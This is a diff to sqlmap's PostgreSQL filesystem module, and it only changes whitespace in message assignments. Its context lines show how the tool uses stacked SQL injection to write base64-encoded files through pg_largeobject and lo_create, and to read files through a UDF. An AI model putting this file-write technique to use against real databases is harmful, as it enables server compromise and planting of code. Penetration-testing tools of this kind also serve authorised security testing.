@@ -24,7 +24,7 @@ class Filesystem(GenericFilesystem):
         GenericFilesystem.__init__(self)
 
     def unionReadFile(self, rFile):
-        errMsg  = "PostgreSQL does not support file reading with UNION "
+        errMsg = "PostgreSQL does not support file reading with UNION "
         errMsg += "query SQL injection technique"
         raise sqlmapUnsupportedFeatureException, errMsg
 
@@ -37,7 +37,7 @@ class Filesystem(GenericFilesystem):
         return self.udfEvalCmd(cmd="'%s'" % rFile, udfName="sys_fileread")
 
     def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
-        errMsg  = "PostgreSQL does not support file upload with UNION "
+        errMsg = "PostgreSQL does not support file upload with UNION "
         errMsg += "query SQL injection technique"
         raise sqlmapUnsupportedFeatureException, errMsg
 
@@ -45,13 +45,13 @@ class Filesystem(GenericFilesystem):
         wFileSize = os.path.getsize(wFile)
 
         if wFileSize > 8192:
-            errMsg  = "on PostgreSQL it is not possible to write files "
+            errMsg = "on PostgreSQL it is not possible to write files "
             errMsg += "bigger than 8192 bytes at the moment"
             raise sqlmapUnsupportedFeatureException, errMsg
 
         self.oid = randomInt()
 
-        debugMsg  = "creating a support table to write the base64 "
+        debugMsg = "creating a support table to write the base64 "
         debugMsg += "encoded file to"
         logger.debug(debugMsg)
 
@@ -60,7 +60,7 @@ class Filesystem(GenericFilesystem):
         logger.debug("encoding file to its base64 string value")
         fcEncodedList = self.fileEncode(wFile, "base64", False)
 
-        debugMsg  = "forging SQL statements to write the base64 "
+        debugMsg = "forging SQL statements to write the base64 "
         debugMsg += "encoded file to the support table"
         logger.debug(debugMsg)
 
@@ -71,7 +71,7 @@ class Filesystem(GenericFilesystem):
         for sqlQuery in sqlQueries:
             inject.goStacked(sqlQuery)
 
-        debugMsg  = "create a new OID for a large object, it implicitly "
+        debugMsg = "create a new OID for a large object, it implicitly "
         debugMsg += "adds an entry in the large objects system table"
         logger.debug(debugMsg)
 
@@ -81,7 +81,7 @@ class Filesystem(GenericFilesystem):
         inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
         inject.goStacked("SELECT lo_create(%d)" % self.oid)
 
-        debugMsg  = "updating the system large objects table assigning to "
+        debugMsg = "updating the system large objects table assigning to "
         debugMsg += "the just created OID the binary (base64 decoded) UDF "
         debugMsg += "as data"
         logger.debug(debugMsg)
@@ -110,7 +110,7 @@ class Filesystem(GenericFilesystem):
         else:
             inject.goStacked("UPDATE pg_largeobject SET data=(DECODE((SELECT %s FROM %s), 'base64')) WHERE loid=%d" % (self.tblField, self.fileTblName, self.oid))
 
-        debugMsg  = "exporting the OID %s file content to " % fileType
+        debugMsg = "exporting the OID %s file content to " % fileType
         debugMsg += "file '%s'" % dFile
         logger.debug(debugMsg)
 
